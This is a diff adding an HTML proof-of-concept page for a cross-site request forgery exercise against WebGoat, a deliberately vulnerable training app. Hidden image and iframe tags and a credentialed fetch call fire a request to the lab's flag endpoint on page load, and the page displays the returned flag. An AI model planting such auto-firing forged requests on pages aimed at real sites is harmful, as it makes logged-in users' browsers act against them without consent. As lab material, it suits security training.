@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h1>External Malicious Site (CSRF Attack)</h1>
+    <p>This page simulates an external attacker's website that triggers a CSRF attack.</p>
+    <p>When you load this page while logged into WebGoat, it will automatically send a request to trigger the CSRF vulnerability.</p>
+      <h2>Attack Status: <span id="status">Loading...</span></h2>
+    <div id="result"></div>
+
+    <!-- Method 1: Image tag automatically loads on page load -->
+    <img src="http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag" style="display:none;" id="csrf-image">
+    
+    <!-- Method 2: Iframe (backup method) -->
+    <iframe src="http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag" style="display:none;" id="csrf-iframe"></iframe>
+
+    <script>
+        document.getElementById('status').textContent = 'Attack Triggered!';
+        document.getElementById('result').innerHTML = '<p style="color: green;">✓ CSRF request sent to WebGoat!</p><p>Check WebGoat for the flag value, then return to confirm it.</p>';
+          // Also try fetch for better debugging
+        setTimeout(function() {
+            fetch('http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag', {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('CSRF Response:', data);
+                try {
+                    const json = JSON.parse(data);
+                    if (json.flag) {
+                        document.getElementById('result').innerHTML += '<p style="background: #e8f5e9; padding: 15px; border-left: 4px solid #4caf50;"><strong>FLAG FOUND:</strong> ' + json.flag + '</p>';
+                    }
+                } catch (e) {
+                    console.log('Response is not JSON:', data);
+                }
+            })
+            .catch(err => console.error('CSRF Error:', err));
+        }, 500);
+    </script>
+</body>
+</html>
